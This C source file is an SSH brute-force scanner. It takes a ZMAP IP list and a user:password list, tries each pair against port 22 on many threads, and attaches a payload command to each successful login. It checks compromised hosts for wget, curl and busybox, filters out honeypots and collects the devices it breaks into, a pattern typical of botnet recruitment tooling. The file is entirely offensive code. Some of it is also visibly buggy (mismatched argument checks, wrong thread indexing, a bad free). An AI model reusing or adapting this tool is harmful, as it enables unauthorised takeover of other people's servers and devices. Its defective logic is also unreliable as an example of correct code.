#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <pthread.h>

#include <libssh2.h>

#include "Scanner/ssh.h"
#include <str.h>
#include <arr.h>
#include <OS/file.h>

const char *PAYLOAD         = "";
int         WORKING         = 0;
int         FAILED          = 0;
int         HONEYPOT        = 0;
int         RUNNING_THREADS = 0;
int         FINISH          = 0;
Device      **Devices       = NULL;
long        idx             = 0;

void    err_n_exit(char *msg) { printf("%s\n", msg); exit(1); }
Array   GetFileLines(const char *filename);
void    runThreads(int THREADS, char *zmap_list, char *pass_list);
void    checkSSH(Device *c);
void    ConsoleLogger();

int main(int argc, char *argv[]) {
    if(argc < 4) {
        printf("[ x ] Error, Invalid argument....\r\nUsage: %s <ip_list> <pass_list>\n", argv[0]);
        return -1;
    }

    String ZMAP_LIST    = NewString(argv[1]);
    String PASS_LIST    = NewString(argv[2]);
    int THREADS         = (argc > 3 ? atoi(argv[3]) : 1);

    if(!strstr(ZMAP_LIST.data, ".txt"))
        err_n_exit("[ x ] Error, Invalid ZMAP list provided....!");
    
    if(!strstr(PASS_LIST.data, ".txt"))
        err_n_exit("[ x ] Error, Invalid PASSWORD list provided....!");

    pthread_t main;
    pthread_create(&main, NULL, (void *)ConsoleLogger, NULL);

    runThreads(THREADS, ZMAP_LIST.data, PASS_LIST.data);

    char buffer[1024];
    fgets(buffer, 1022, stdin);
    return 0;
}

void ConsoleLogger() {
    while(1) {
        printf("[ + ] THREADS RUNNING: %d | WORKING: %d | FAILED %d | HONEYPOT: %d\n", RUNNING_THREADS, WORKING, FAILED, HONEYPOT);
        sleep(1);
        if(FINISH)
            exit(0);
    }
}

// Get the password list in a array of lines
Array GetFileLines(const char *filename) {
    FILE *fd = fopen(filename, "r");

    fseek(fd, 0L, SEEK_END);
    long sz = ftell(fd);
    fseek(fd, 0L, SEEK_SET);

    char *data = (char *)malloc(sz);
    fread(data, sz, 1, fd);

    String content = NewString(data);

    
    Array new = NewArray(NULL);
    char line_count = content.CountChar(&content, '\n');
    char **lines = content.Split(&content, "\n");
    
    for(int i = 0; i < line_count; i++)
        new.Append(&new, lines[i]);
    
    new.arr[new.idx] = NULL;

    content.Destruct(&content);

    return new;
}

void BruteforceIP(char *IP_ADDRESS, char *pass_list) {

}

// Run All ZMAP List(s) w/ Password(s) list
void runThreads(int THREADS, char *zmap_list, char *pass_list) {
    if(!zmap_list || !pass_list)
        return;

    Array ip_list = GetFileLines(zmap_list);
    Array pass_lines = GetFileLines(pass_list);

    if(pass_lines.idx < 0)
        return;

    Devices = (Device **)malloc(sizeof(Device) * 1);
    memset(Devices, '\0', sizeof(Device) * 1);

    pthread_t id[THREADS];
    for(int i = 0; i < ip_list.idx; i++ ) {
        printf("[ + ] Attempting %s....!\n", (char *)ip_list.arr[i]);
        for(int p = 0; p < pass_lines.idx -1 ; p++) {
            if(pass_lines.arr[p] == NULL)
                break;

            String pass = NewString(pass_lines.arr[p]);
            if(!strstr(pass.data, ":")) {
                pass.Destruct(&pass);
                continue;
            }

            char **args = pass.Split(&pass, ":");
            if(args[1] == NULL)
                break;
            
            Device *ssh = NewDevice(ip_list.arr[i], 22, args[0], args[1]);
            ssh->Cmd = (char *)PAYLOAD;

            (void)(RUNNING_THREADS >= THREADS ? sleep(8) : 0);
            (void)(RUNNING_THREADS >= THREADS ? sleep(8) : 0);
            
            pthread_create(&id[i], NULL, (void *)checkSSH, (void *)ssh);
            RUNNING_THREADS++;
            
            pass.Destruct(&pass);
            free(args[p]);
        }
    }

    printf("Awaiting threads....\n");
    for(int c = 0; c < ip_list.idx; c++) {
        for(int p = 0; p < pass_lines.idx -1 ; p++) {
            pthread_join(id[p], NULL);
            RUNNING_THREADS--;
        }
    }

    ip_list.Destruct(&ip_list);
    pass_lines.Destruct(&pass_lines);

    FINISH = 1;
}

void checkSSH(Device *c) {
    int chk = ssh(c);

    printf("SSH: %s | Username: %s | Pass: %s Returned: %d | LoggedIn: %d | WGET: %d | CURL: %d | Busybox: %d | Honeypot: %d\n", 
            c->IP, c->Username, c->Password, chk, 
            c->LoggedIn, c->isWGET, c->isCURL, 
            c->isBusybox, c->isHoneypot
    );

    switch(chk) {
        case -1: {
            HONEYPOT++;
            DestroyDevice(c);
            break;
        }
        case 0: {
            FAILED++;
            DestroyDevice(c);
            break;
        }
        case 1: {
            WORKING++;
            Devices[idx] = c;
            idx++;
            Devices = (Device **)realloc(Devices, sizeof(Device) * (idx + 1));
            break;
        }
    }
}